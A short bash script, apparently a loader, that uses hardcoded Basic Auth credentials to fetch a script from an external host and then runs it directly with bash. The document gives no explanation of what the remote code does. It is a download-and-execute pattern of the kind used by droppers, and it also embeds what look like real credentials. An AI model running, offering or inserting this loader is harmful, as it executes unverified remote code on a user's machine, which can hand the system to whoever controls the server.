#!/usr/bin/env bash
# Basic Auth → curl → download & execute remote Bash script

set -euo pipefail

# ------------- CONFIG -----------------
URL="https://run.nobitapro.online"

USER="user-ty3twTsg@Ic2mymIke(ERa4qgNudHp#+v!MEEnTpIdy8hyVAK2uD@CJ(EMt&kHcE"
PASS="pdxnfjaUFLH9j2Tw*Pyy^fZqxRMN*jrar^LFa@R%Z(^KaUnceDvjSC$w$Us3mJc@"
# --------------------------------------

# ---- dependency check ----
if ! command -v curl >/dev/null 2>&1; then
  echo "Error: curl is required but not installed." >&2
  exit 1
fi

# ---- temp file for remote script ----
script_file="$(mktemp)"

cleanup() {
  rm -f "$script_file"
}
trap cleanup EXIT

# ---- download with Basic Auth ----
if curl -fsS -u "${USER}:${PASS}" -o "$script_file" "$URL"; then
  bash "$script_file"
else
  echo "Authentication or download failed." >&2
  exit 1
fi
